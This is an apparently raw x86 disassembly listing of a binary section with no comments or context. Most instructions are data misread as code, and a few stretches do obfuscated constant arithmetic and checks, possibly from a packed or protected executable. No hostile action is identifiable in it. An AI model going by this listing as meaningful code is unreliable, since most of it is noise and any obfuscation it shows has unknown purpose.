  40bbdc:	xchg   esi,eax
  40bbdd:	jo     0x40bc2a
  40bbdf:	fwait
  40bbe0:	les    ebp,FWORD PTR [esi]
  40bbe2:	fnstcw WORD PTR [ebx-0x7c]
  40bbe5:	clc    
  40bbe6:	stos   BYTE PTR es:[edi],al
  40bbe7:	mov    esp,edx
  40bbe9:	test   DWORD PTR ds:0x1f66696b,esi
  40bbef:	xor    DWORD PTR [edi-0x6c],edx
  40bbf2:	mov    DWORD PTR ds:0x4b63cf3d,eax
  40bbf8:	xchg   ebx,eax
  40bbf9:	inc    ebx
  40bbfa:	mov    esi,0x3ffc9577
  40bbff:	sti    
  40bc00:	fmulp  st(1),st
  40bc02:	bound  edi,QWORD PTR ds:0x858248c5
  40bc08:	mov    ds:0xaaf99d3b,al
  40bc0d:	xor    eax,0x78878d90
  40bc12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc13:	add    al,al
  40bc15:	fs es push 0xffffff89
  40bc19:	pop    es
  40bc1a:	dec    DWORD PTR [ebx]
  40bc1c:	fild   DWORD PTR [ebx]
  40bc1e:	ret    
  40bc1f:	pop    eax
  40bc20:	and    DWORD PTR [ebx-0x239e5b30],ecx
  40bc26:	sbb    eax,0xf161fed6
  40bc2b:	xchg   ebp,eax
  40bc2c:	ffree  st(5)
  40bc2e:	rcr    BYTE PTR [ecx+0x5edca2b8],0xee
  40bc35:	or     BYTE PTR [esi],bl
  40bc37:	aad    0x66
  40bc39:	mov    ebx,0x87c90440
  40bc3e:	mov    bh,0xc4
  40bc40:	ror    esp,cl
  40bc42:	inc    ebp
  40bc43:	jle    0x40bbd1
  40bc45:	mov    ax,0xa006
  40bc49:	imul   ebp,DWORD PTR [edx+0x158c0cea],0xffffff9a
  40bc50:	jmp    0x40bc7b
  40bc52:	repnz mov ds,WORD PTR [esi-0xf]
  40bc56:	xchg   ecx,eax
  40bc57:	cmp    eax,0x4735a229
  40bc5c:	xchg   esp,eax
  40bc5d:	add    al,0x74
  40bc5f:	sar    DWORD PTR [eax+0x2acc3a1c],cl
  40bc65:	jae    0x40bcc6
  40bc67:	sub    al,BYTE PTR [ebx]
  40bc69:	mov    al,ds:0x1db5601
  40bc6e:	fadd   QWORD PTR [ebp+0x75]
  40bc71:	mov    ecx,0x1884a154
  40bc76:	dec    esp
  40bc77:	mov    ds:0x1966fce8,eax
  40bc7c:	dec    esi
  40bc7d:	xchg   ecx,eax
  40bc7e:	xlat   BYTE PTR ds:[ebx]
  40bc7f:	sbb    dl,dh
  40bc81:	cli    
  40bc82:	xor    eax,0xb63b12d4
  40bc87:	xlat   BYTE PTR ds:[ebx]
  40bc88:	jg     0x40bcd6
  40bc8a:	stos   DWORD PTR es:[edi],eax
  40bc8b:	inc    esp
  40bc8c:	shl    BYTE PTR ss:[ebx-0x4c],cl
  40bc90:	ror    BYTE PTR [edx+0x3045da76],1
  40bc96:	mov    ecx,0x5d54faca
  40bc9b:	mov    ds:0xb551d1d1,eax
  40bca0:	mov    WORD PTR [edi],gs
  40bca2:	and    BYTE PTR [eax],ah
  40bca4:	xchg   ebp,eax
  40bca5:	pushf  
  40bca6:	pop    ecx
  40bca7:	fwait
  40bca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca9:	sub    ebp,ebx
  40bcab:	ror    DWORD PTR [ecx+0x7a],cl
  40bcae:	jg     0x40bd2a
  40bcb0:	jno    0x40bc67
  40bcb2:	or     al,0x90
  40bcb4:	cmp    al,0x40
  40bcb6:	mov    ebp,0x3517e4d4
  40bcbb:	push   esp
  40bcbc:	sub    eax,0x39b356bf
  40bcc1:	dec    ecx
  40bcc2:	jno    0x40bcbd
  40bcc4:	pushf  
  40bcc5:	repz xchg esp,eax
  40bcc7:	or     eax,0xf068600c
  40bccc:	daa    
  40bccd:	push   ss
  40bcce:	push   ecx
  40bccf:	mov    ebp,0xe25f22aa
  40bcd4:	or     esi,DWORD PTR [edi]
  40bcd6:	je     0x40bcc8
  40bcd8:	mov    al,0xba
  40bcda:	sahf   
  40bcdb:	jp     0x40bd3c
  40bcdd:	add    ah,bh
  40bcdf:	fld    QWORD PTR [edx-0x7fa88ac2]
  40bce5:	addr16 mov ecx,0xb38f349b
  40bceb:	xchg   BYTE PTR [esi],cl
  40bced:	out    0xe1,eax
  40bcef:	push   es
  40bcf0:	ret    
  40bcf1:	dec    esp
  40bcf2:	repnz add dl,BYTE PTR [edx]
  40bcf5:	arpl   WORD PTR ds:0x9cee2dd2,bx
  40bcfb:	push   edx
  40bcfc:	je     0x40bc94
  40bcfe:	adc    dh,BYTE PTR [ecx-0x28]
  40bd01:	fcom   DWORD PTR [edx]
  40bd03:	xchg   si,ax
  40bd05:	enter  0x7371,0x7d
  40bd09:	int3   
  40bd0a:	jnp    0x40bd6d
  40bd0c:	mov    bl,0x95
  40bd0e:	aas    
  40bd0f:	std    
  40bd10:	pop    ds
  40bd11:	jge    0x40bcfb
  40bd13:	iret   
  40bd14:	lods   eax,DWORD PTR ds:[esi]
  40bd15:	fild   QWORD PTR [edx]
  40bd17:	add    BYTE PTR [ebp+eax*4-0x42],ah
  40bd1b:	ret    
  40bd1c:	or     ebp,DWORD PTR [ebx-0x66]
  40bd1f:	push   0xffffffe9
  40bd21:	lock fild QWORD PTR ds:0x31277523
  40bd28:	stos   DWORD PTR es:[edi],eax
  40bd29:	test   eax,0x39a53a6
  40bd2e:	cmp    DWORD PTR fs:[edx+0x3decdfae],0x738100e6
  40bd39:	xor    eax,0xabb42a6c
  40bd3e:	imul   ebp,DWORD PTR [edi-0xb],0xffffff8a
  40bd42:	adc    dl,BYTE PTR [edx+edi*1]
  40bd45:	adc    BYTE PTR ds:0x42af5875,0x7d
  40bd4c:	lods   al,BYTE PTR ds:[esi]
  40bd4d:	and    esp,DWORD PTR [ebx+0x5629d82]
  40bd53:	fmul   st(2),st
  40bd55:	aas    
  40bd56:	outs   dx,DWORD PTR ds:[esi]
  40bd57:	je     0x40bd4a
  40bd59:	and    al,0xab
  40bd5b:	pushf  
  40bd5c:	adc    BYTE PTR ds:0x742942ae,bl
  40bd62:	call   0xf72d:0xeeac632e
  40bd69:	add    eax,0xd6ab018c
  40bd6e:	xchg   ecx,edx
  40bd70:	xchg   ebp,eax
  40bd71:	push   0x91c7ebad
  40bd76:	mov    eax,ds:0x82902a2f
  40bd7b:	xchg   edi,eax
  40bd7c:	or     DWORD PTR [ebp-0x274d8f7],esi
  40bd82:	jo     0x40bd07
  40bd84:	outs   dx,DWORD PTR ds:[esi]
  40bd85:	idiv   bl
  40bd87:	int    0x1d
  40bd89:	ficomp DWORD PTR [ebx]
  40bd8b:	push   0xc
  40bd8d:	and    eax,0xd72d2d94
  40bd92:	mov    eax,0x56261fe4
  40bd97:	dec    esi
  40bd98:	dec    esp
  40bd99:	and    eax,0xf85925f1
  40bd9e:	cld    
  40bd9f:	icebp  
  40bda0:	jae    0x40bd62
  40bda2:	jmp    0xcad0:0x345e5a0d
  40bda9:	int    0xfb
  40bdab:	mov    cl,bl
  40bdad:	in     eax,dx
  40bdae:	in     eax,0x3d
  40bdb0:	mov    WORD PTR [edi+ebp*8+0x47],fs
  40bdb4:	xchg   ecx,eax
  40bdb5:	pop    ds
  40bdb6:	cdq    
  40bdb7:	std    
  40bdb8:	dec    esi
  40bdb9:	xchg   esp,eax
  40bdba:	xor    DWORD PTR [eax-0x5383ee5e],ecx
  40bdc0:	hlt    
  40bdc1:	sbb    eax,0x84391bc8
  40bdc6:	loop   0x40be1a
  40bdc8:	dec    eax
  40bdc9:	mov    ah,0x9a
  40bdcb:	push   ds
  40bdcc:	add    cl,BYTE PTR [edi+0x7f2a4859]
  40bdd2:	out    0xdc,eax
  40bdd4:	add    cl,BYTE PTR [ecx-0x5578b08b]
  40bdda:	lahf   
  40bddb:	pusha  
  40bddc:	cmp    edi,DWORD PTR [esi-0x2a]
  40bddf:	push   esp
  40bde0:	sub    eax,0x27be159d
  40bde5:	pop    esi
  40bde6:	sub    esi,DWORD PTR [edx-0xdb1097]
  40bdec:	sbb    edx,eax
  40bdee:	rcr    DWORD PTR [edx],0xbc
  40bdf1:	pop    ss
  40bdf2:	call   FWORD PTR [edx+0x4dc2bb90]
  40bdf8:	sar    BYTE PTR [ebx-0x30971aa2],cl
  40bdfe:	mov    cl,0x7d
  40be00:	arpl   WORD PTR ds:0x913bc309,cx
  40be06:	stc    
  40be07:	in     eax,0x90
  40be09:	loopne 0x40bdb8
  40be0b:	(bad)
  40be10:	mov    eax,ds:0xd3729856
  40be15:	shr    BYTE PTR [edx],1
  40be17:	push   es
  40be18:	stos   BYTE PTR es:[edi],al
  40be19:	jecxz  0x40be18
  40be1b:	or     eax,0x780e40c5
  40be20:	dec    ebx
  40be21:	jp     0x40be58
  40be23:	push   eax
  40be24:	das    
  40be25:	aaa    
  40be26:	pusha  
  40be27:	addr16 push ss
  40be29:	push   0x52
  40be2b:	push   ebx
  40be2c:	dec    eax
  40be2d:	inc    eax
  40be2e:	in     al,0x15
  40be30:	adc    BYTE PTR [edx+0x21],bl
  40be33:	call   0x80ea48da
  40be38:	into   
  40be39:	scas   eax,DWORD PTR es:[edi]
  40be3a:	push   ss
  40be3b:	ins    BYTE PTR es:[edi],dx
  40be3c:	les    edi,FWORD PTR [ebx]
  40be3e:	add    al,0x99
  40be40:	inc    eax
  40be41:	ins    BYTE PTR es:[edi],dx
  40be42:	mov    ebp,0xf69efd2a
  40be47:	les    ebp,FWORD PTR [edi+0xdaa7603]
  40be4d:	adc    al,0xd7
  40be4f:	enter  0x1da3,0xdd
  40be53:	push   ebp
  40be54:	icebp  
  40be55:	scas   al,BYTE PTR es:[edi]
  40be56:	das    
  40be57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be58:	popf   
  40be59:	leave  
  40be5a:	sbb    al,0x50
  40be5c:	jmp    0x2578:0x4a0a4c65
  40be63:	push   ebp
  40be64:	mov    ds:0x3695ef3a,al
  40be69:	(bad)
  40be6c:	in     al,0x4
  40be6e:	inc    edi
  40be6f:	pop    eax
  40be70:	sub    edx,DWORD PTR [ebp+0x56469614]
  40be76:	mov    al,0xf9
  40be78:	shl    BYTE PTR [edi-0x1a9ed855],cl
  40be7e:	test   BYTE PTR ds:0xcc43d11,cl
  40be84:	fwait
  40be85:	dec    esi
  40be86:	repnz out 0x89,al
  40be89:	dec    ebp
  40be8a:	hlt    
  40be8b:	mov    DWORD PTR [ebp-0x20],0x4a50
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bfa9
  40bf55:	ds lock mov esi,0x181805b6
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    cl,dl
  40bf61:	(bad)  
  40bf62:	outs   dx,DWORD PTR ds:[esi]
  40bf63:	clc    
  40bf64:	retf   
  40bf65:	sar    BYTE PTR [esi+0x17],1
  40bf68:	les    esi,FWORD PTR [ebx]
  40bf6a:	in     al,0x2b
  40bf6c:	jmp    0xb3d9:0x60c2a125
  40bf73:	or     dh,BYTE PTR [edi-0x63bc7622]
  40bf79:	xchg   ebx,eax
  40bf7a:	adc    eax,0xa0d8fa12
  40bf7f:	xchg   ecx,eax
  40bf80:	(bad)  
  40bf81:	fcmovnbe st,st(4)
  40bf83:	arpl   WORD PTR [edx],cx
  40bf85:	xchg   ecx,eax
  40bf86:	cmp    BYTE PTR [ebx-0x68],ah
  40bf89:	mov    eax,0x22de2bdf
  40bf8e:	pop    ds
  40bf8f:	in     eax,0xab
  40bf91:	mov    eax,0x5ab7783e
  40bf96:	pop    ebx
  40bf97:	sti    
  40bf98:	adc    DWORD PTR [ecx],0xffffff83
  40bf9b:	fcom   DWORD PTR [ebx-0x23e4d4e5]
  40bfa1:	push   edx
  40bfa2:	pushf  
  40bfa3:	cli    
  40bfa4:	fs dec edx
  40bfa6:	pop    edx
  40bfa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfa8:	pop    eax
  40bfa9:	jns    0x40bf5c
  40bfab:	mov    bh,0x64
  40bfad:	add    BYTE PTR [ebp-0x7a],ah
  40bfb0:	es push ss
  40bfb2:	retf   0xb030
  40bfb5:	(bad)  
  40bfb6:	rol    ebx,cl
  40bfb8:	push   ds
  40bfb9:	jp     0x40bfd5
  40bfbb:	push   esi
  40bfbc:	aaa    
  40bfbd:	les    edx,FWORD PTR [ebp-0x31a6231a]
  40bfc3:	scas   eax,DWORD PTR es:[edi]
  40bfc4:	jmp    0x5becbb4
  40bfc9:	jnp    0x40c046
  40bfcb:	into   
  40bfcc:	dec    esp
  40bfcd:	retf   
  40bfce:	pop    edi
  40bfcf:	jno    0x40c002
  40bfd1:	test   DWORD PTR [ecx],edi
  40bfd3:	xchg   BYTE PTR [esi-0xa],dh
  40bfd6:	pop    ebp
  40bfd7:	jae    0x40bfea
  40bfd9:	adc    dl,ah
  40bfdb:	inc    eax
  40bfdc:	aas    
  40bfdd:	pop    edx
  40bfde:	popf   
  40bfdf:	test   BYTE PTR [edx+ebx*8],0x3d
  40bfe3:	sub    ecx,DWORD PTR [edx+0x28]
  40bfe6:	cmp    BYTE PTR [ebx+0x1de9fd07],al
  40bfec:	or     ecx,DWORD PTR [ecx+0x43ae8cdb]
  40bff2:	pop    edi
  40bff3:	rcr    DWORD PTR cs:[edi-0x1d],0x4b
  40bff8:	dec    esi
  40bff9:	inc    ecx
  40bffa:	jbe    0x40bfdf
  40bffc:	or     BYTE PTR [esp+edx*1+0x15872d44],al
  40c003:	inc    esp
  40c004:	daa    
  40c005:	push   es
  40c006:	dec    esi
  40c007:	(bad)  
  40c008:	and    DWORD PTR [ebx-0x5c062720],esi
  40c00e:	jp     0x40bf9b
  40c010:	add    eax,0x4e5fba4f
  40c015:	cmc    
  40c016:	jmp    0x9d8ba944
  40c01b:	fdiv   st,st(6)
  40c01d:	add    ebp,DWORD PTR [edx-0x681d08a5]
  40c023:	add    edi,edx
  40c025:	in     eax,dx
  40c026:	pop    esi
  40c027:	ror    ebx,cl
  40c029:	mov    edi,es
  40c02b:	nop
  40c02c:	pop    ebp
  40c02d:	add    ch,dh
  40c02f:	sub    DWORD PTR [ebp-0xa3f9ea5],eax
  40c035:	aas    
  40c036:	stos   BYTE PTR es:[edi],al
  40c037:	addr16 (bad) 
  40c03a:	pop    esi
  40c03b:	pop    ebx
  40c03c:	xchg   DWORD PTR [ecx+eiz*1],edx
  40c03f:	mov    ebx,0xd50a50b7
  40c044:	stos   DWORD PTR es:[edi],eax
  40c045:	push   esi
  40c046:	cmp    ecx,DWORD PTR [ebx+edx*4+0x31]
  40c04a:	fadd   st,st(3)
  40c04c:	stos   DWORD PTR es:[edi],eax
  40c04d:	dec    ebx
  40c04e:	ss sub BYTE PTR gs:[ebp+0x238c90ad],0x4a
  40c057:	in     eax,dx
  40c058:	cli    
  40c059:	adc    eax,0x519bca7
  40c05e:	inc    eax
  40c05f:	or     ecx,edi
  40c061:	lds    ecx,FWORD PTR [ecx+0xed5861d]
  40c067:	daa    
  40c068:	adc    al,0x26
  40c06a:	or     dh,BYTE PTR [edi+0x67]
  40c06d:	ins    DWORD PTR es:[edi],dx
  40c06e:	fiadd  WORD PTR [ebx+0x3e]
  40c071:	pop    ebp
  40c072:	push   0xf9808ed
  40c077:	mov    eax,ds:0xc1bd9192
  40c07c:	xor    cl,ch
  40c07e:	lea    ebx,[ecx]
  40c080:	mov    dh,BYTE PTR [ebx+ebp*1+0x4708a5db]
  40c087:	pop    ss
  40c088:	or     cl,ch
  40c08a:	out    dx,al
  40c08b:	icebp  
  40c08c:	icebp  
  40c08d:	xchg   ecx,eax
  40c08e:	inc    esi
  40c08f:	adc    dh,BYTE PTR [edx-0x9d62634]
  40c095:	enter  0x904f,0x1f
  40c099:	mov    BYTE PTR [ebx-0x27],ah
  40c09c:	gs (bad) 
  40c09e:	push   eax
  40c09f:	jbe    0x40c076
  40c0a1:	int    0xea
  40c0a3:	inc    ebp
  40c0a4:	mov    eax,ds:0x94eca854
  40c0a9:	dec    edi
  40c0aa:	sub    al,ch
  40c0ac:	sbb    al,dh
  40c0ae:	gs jno 0x40c07a
  40c0b1:	jne    0x40c102
  40c0b3:	mov    al,0x63
  40c0b5:	call   0xc2f9:0xe820ff8e
  40c0bc:	(bad)  
  40c0bd:	popa   
  40c0be:	test   DWORD PTR [edi],edx
  40c0c0:	jnp    0x40c08f
  40c0c2:	xchg   edx,eax
  40c0c3:	pop    es
  40c0c4:	idiv   DWORD PTR [esi+eax*2-0x5bd9d702]
  40c0cb:	dec    BYTE PTR [ebx-0x6e]
  40c0ce:	pop    eax
  40c0cf:	scas   eax,DWORD PTR es:[edi]
  40c0d0:	(bad)  
  40c0d1:	rcl    BYTE PTR [ecx],cl
  40c0d3:	repnz test dl,bh
  40c0d6:	in     al,0xf6
  40c0d8:	ss xchg bl,dl
  40c0db:	mov    eax,0x37bbf9f2
  40c0e0:	mov    dl,0x1a
  40c0e2:	fdivr  DWORD PTR [ebx+0x4181d274]
  40c0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0e9:	add    eax,0x15862d54
  40c0ee:	stos   DWORD PTR es:[edi],eax
  40c0ef:	jb     0x40c142
  40c0f1:	retf   
  40c0f2:	xchg   edi,eax
  40c0f3:	(bad)
  40c0f6:	pop    ebx
  40c0f7:	inc    ecx
  40c0f8:	inc    ebp
  40c0f9:	mov    WORD PTR [esi+esi*4+0x73],es
  40c0fd:	inc    edx
  40c0fe:	out    dx,al
  40c0ff:	je     0x40c09d
  40c101:	push   ebp
  40c102:	sbb    dh,bh
  40c104:	cdq    
  40c105:	push   cs
  40c106:	xchg   esp,eax
  40c107:	jns    0x40c0da
  40c109:	sbb    DWORD PTR [esi],edi
  40c10b:	lods   eax,DWORD PTR ds:[esi]
  40c10c:	or     DWORD PTR [edi+ebx*2],ebp
  40c10f:	jle    0x40c172
  40c111:	and    DWORD PTR [esi+eiz*2],esi
  40c114:	xor    eax,0xed5571a8
  40c119:	setp   BYTE PTR [edi]
  40c11c:	and    ch,ah
  40c11e:	pop    es
  40c11f:	push   ebx
  40c120:	bound  edi,QWORD PTR [edi]
  40c122:	pop    edx
  40c123:	loope  0x40c111
  40c125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c126:	or     al,0x80
  40c128:	arpl   WORD PTR [edi+0x72d29326],bx
  40c12e:	mov    esi,0xcdc59ca1
  40c133:	push   ebx
  40c134:	mov    ds:0x4b4b69e4,al
  40c139:	inc    ebp
  40c13a:	xor    ebp,ebp
  40c13c:	push   ecx
  40c13d:	in     al,dx
  40c13e:	jle    0x40c0f7
  40c140:	in     eax,dx
  40c141:	out    dx,eax
  40c142:	adc    BYTE PTR [edx+0x5475cced],ah
  40c148:	adc    eax,0x44cf13a5
  40c14d:	adc    BYTE PTR ds:0xc0b004c,ah
  40c153:	mov    edx,0xeead34eb
  40c158:	adc    DWORD PTR [ebp+ebx*2-0x2c9bb70e],esi
  40c15f:	ds pushf 
  40c161:	jecxz  0x40c114
  40c163:	fsubr  QWORD PTR [ebp-0x2c]
  40c166:	inc    esp
  40c167:	dec    ecx
  40c168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c169:	shr    esp,0x38
  40c16c:	inc    edx
  40c16d:	nop
  40c16e:	hlt    
  40c16f:	adc    al,0x68
  40c171:	xchg   edi,eax
  40c172:	add    BYTE PTR [edx+0x16],dh
  40c175:	out    dx,al
  40c176:	xchg   ecx,eax
  40c177:	fcmovu st,st(5)
  40c179:	push   es
  40c17a:	push   es
  40c17b:	imul   ebp,DWORD PTR [edi],0xb4df3ad0
  40c181:	and    ebx,DWORD PTR [edx+0x35d618ec]
  40c187:	aad    0xc4
  40c189:	in     eax,dx
  40c18a:	pop    edi
  40c18b:	(bad)  [edx+0x13]
  40c18e:	sbb    eax,0xb7cf460e
  40c193:	sub    bh,0x3f
  40c196:	sbb    BYTE PTR [ecx-0x62],0xbc
  40c19a:	sbb    eax,0xe0a4f842
  40c19f:	sub    cl,dh
  40c1a1:	shr    BYTE PTR [edi+0xd64f3b7],1
  40c1a7:	pop    esp
  40c1a8:	xchg   BYTE PTR [edx],dh
  40c1aa:	out    dx,al
  40c1ab:	jg     0x40c212
  40c1ad:	and    al,0x17
  40c1af:	popaw  
  40c1b1:	cmp    bl,ch
  40c1b3:	sub    edx,edi
  40c1b5:	cmp    al,0x4
  40c1b7:	leave  
  40c1b8:	pop    edi
  40c1b9:	mov    eax,0x2b7cd76e
  40c1be:	push   ds
  40c1bf:	shl    DWORD PTR [edi-0x7b],0x60
  40c1c3:	inc    edi
  40c1c4:	xor    dl,BYTE PTR [esi]
  40c1c6:	fprem  
  40c1c8:	pop    DWORD PTR [eax+ebx*4]
  40c1cb:	popf   
  40c1cc:	mov    dh,0x4f
  40c1ce:	lahf   
  40c1cf:	push   ebx
  40c1d0:	and    bl,BYTE PTR [edi]
  40c1d2:	shl    dl,1
  40c1d4:	retf   0x40d8
  40c1d7:	es out dx,eax
  40c1d9:	jae    0x40c1eb
  40c1db:	imul   esi,DWORD PTR [ecx-0x55],0xe682c9e3
  40c1e2:	adc    al,0xce
  40c1e4:	adc    al,bl
  40c1e6:	lock (bad) 
  40c1e8:	hlt    
  40c1e9:	jae    0x40c265
  40c1eb:	(bad)  
  40c1ec:	mov    ebp,edx
  40c1ee:	cs push ss
  40c1f0:	xchg   edi,eax
  40c1f1:	enter  0xcd19,0x39
  40c1f5:	cdq    
  40c1f6:	je     0x40c1cc
  40c1f8:	mov    bh,BYTE PTR [edi+0x50]
  40c1fb:	sub    al,al
  40c1fd:	popf   
  40c1fe:	int3   
  40c1ff:	in     eax,dx
  40c200:	adc    cl,BYTE PTR ds:0xa428a769
  40c206:	(bad)  
  40c207:	mov    ecx,0x920d868d
  40c20c:	adc    dh,BYTE PTR [esi-0x10]
  40c20f:	rcr    DWORD PTR [ebp+0x741b16be],0x1f
  40c216:	dec    edx
  40c217:	mov    DWORD PTR [ebx-0x5e16f0b],esp
  40c21d:	loope  0x40c1a9
  40c21f:	dec    eax
  40c220:	imul   eax,DWORD PTR [edx+ebx*1],0x7b
  40c224:	cld    
  40c225:	loope  0x40c2a6
  40c227:	xchg   edx,eax
  40c228:	mov    eax,0xd243b64e
  40c22d:	pusha  
  40c22e:	inc    edx
  40c22f:	sbb    ch,bh
  40c231:	dec    esi
  40c232:	scas   al,BYTE PTR es:[edi]
  40c233:	arpl   WORD PTR [edx],ax
  40c235:	mov    WORD PTR ds:0xa0008451,cs
  40c23b:	push   ds
  40c23c:	shl    DWORD PTR [ecx],1
  40c23e:	xor    eax,0x9cbd43ae
  40c243:	inc    ebp
  40c244:	pusha  
  40c245:	add    dh,BYTE PTR [edx]
  40c247:	test   DWORD PTR [ecx-0x6f44dc0],edi
  40c24d:	sub    dl,ch
  40c24f:	or     BYTE PTR [edi],ah
  40c251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c252:	enter  0xe58b,0xcd
  40c256:	loop   0x40c2d0
  40c258:	and    ebp,ebp
  40c25a:	ds jle 0x40c2d3
  40c25d:	mov    bh,0x74
  40c25f:	cmp    eax,0xae45fec2
  40c264:	jmp    0x56c7f242
  40c269:	add    eax,0xf03899c5
  40c26e:	iret   
  40c26f:	icebp  
  40c270:	cmp    esp,DWORD PTR [ebx-0x5b554302]
  40c276:	sub    BYTE PTR [esi-0x6d],dh
  40c279:	fsub   DWORD PTR [edi]
  40c27b:	and    BYTE PTR [eax],cl
  40c27d:	stos   DWORD PTR es:[edi],eax
  40c27e:	lods   eax,DWORD PTR ds:[esi]
  40c27f:	ret    0x3fb7
  40c282:	sar    DWORD PTR [ebx+0x3],1
  40c285:	imul   ecx,DWORD PTR [ecx-0x2d],0xffffff85
  40c289:	pop    ebp
  40c28a:	mov    esp,DWORD PTR [ecx]
  40c28c:	push   edi
  40c28d:	or     BYTE PTR [ebx],bh
  40c28f:	call   0x958a:0x1fde5a25
  40c296:	test   eax,0xef9a22d1
  40c29b:	sub    WORD PTR [edx+0x40],0xffb6
  40c2a0:	adc    dh,BYTE PTR [eax+ebp*8+0x2]
  40c2a4:	mov    bl,0x8
  40c2a6:	pop    ebx
  40c2a7:	mov    bh,0xef
  40c2a9:	pusha  
  40c2aa:	and    eax,0xe97cb68f
  40c2af:	ret    0x1b6
  40c2b2:	mov    al,ds:0x6b556b2f
  40c2b7:	in     al,dx
  40c2b8:	mov    dl,0x9d
  40c2ba:	and    bh,BYTE PTR [ecx+ebp*4]
  40c2bd:	add    eax,0xd02b4d99
  40c2c2:	(bad)  
  40c2c3:	out    dx,eax
  40c2c4:	aaa    
  40c2c5:	mov    al,0x99
  40c2c7:	scas   al,BYTE PTR es:[edi]
  40c2c8:	add    DWORD PTR [eax],0x5c2849b9
  40c2ce:	mov    bh,0xcd
  40c2d0:	test   DWORD PTR [edi+ebp*4-0x63],0x2ef3e474
  40c2d8:	or     eax,DWORD PTR [edx]
  40c2da:	jb     0x40c2cc
  40c2dc:	sbb    bl,bh
  40c2de:	pop    ss
  40c2df:	lods   eax,DWORD PTR ds:[esi]
  40c2e0:	and    BYTE PTR [eax+0x53],al
  40c2e3:	xor    cl,BYTE PTR [ecx]
  40c2e5:	jmp    0x657c:0x696cdade
  40c2ec:	cdq    
  40c2ed:	xor    ah,ch
  40c2ef:	mov    al,ds:0x93434f5
  40c2f4:	mov    edi,0x3d333c6f
  40c2f9:	(bad)  
  40c2fa:	mul    edi
  40c2fc:	stc    
  40c2fd:	inc    ebx
  40c2fe:	pop    ecx
  40c2ff:	inc    esi
  40c300:	leave  
  40c301:	lahf   
  40c302:	xor    eax,0xf669975d
  40c307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c308:	lahf   
  40c309:	aas    
  40c30a:	iret   
  40c30b:	pop    ecx
  40c30c:	mov    WORD PTR [esi],cs
  40c30e:	call   0x6c85:0x8531ba1f
  40c315:	outs   dx,BYTE PTR ds:[esi]
  40c316:	daa    
  40c317:	loope  0x40c302
  40c319:	adc    edi,esp
  40c31b:	pop    ss
  40c31c:	inc    ecx
  40c31d:	(bad)  
  40c31f:	xor    eax,edi
  40c321:	repz mov ebp,0xf46d9d29
  40c327:	into   
  40c328:	dec    ecx
  40c329:	jmp    0x40c365
  40c32b:	xor    al,0x6b
  40c32d:	into   
  40c32e:	adc    BYTE PTR [edi],cl
  40c330:	push   ebx
  40c331:	loopne 0x40c369
  40c333:	sbb    BYTE PTR [eax-0x13],bh
  40c336:	icebp  
  40c337:	pushf  
  40c338:	jmp    0xa922ab8d
  40c33d:	add    BYTE PTR [eax],al
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42272c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
  40c363:	mov    ecx,DWORD PTR [ebp-0x14]
  40c366:	mov    edx,DWORD PTR [ebp-0x18]
  40c369:	mov    esi,DWORD PTR [ebp-0x14]
  40c36c:	shrd   eax,ecx,0x2
  40c370:	shl    edx,0x1e
  40c373:	mov    edx,DWORD PTR ds:0x422518
  40c379:	mov    edx,DWORD PTR [edx+0x1a8]
  40c37f:	shr    ecx,0x2
  40c382:	xor    esi,esi
  40c384:	mov    ecx,0x329e695d
  40c389:	xor    eax,ecx
  40c38b:	or     eax,esi
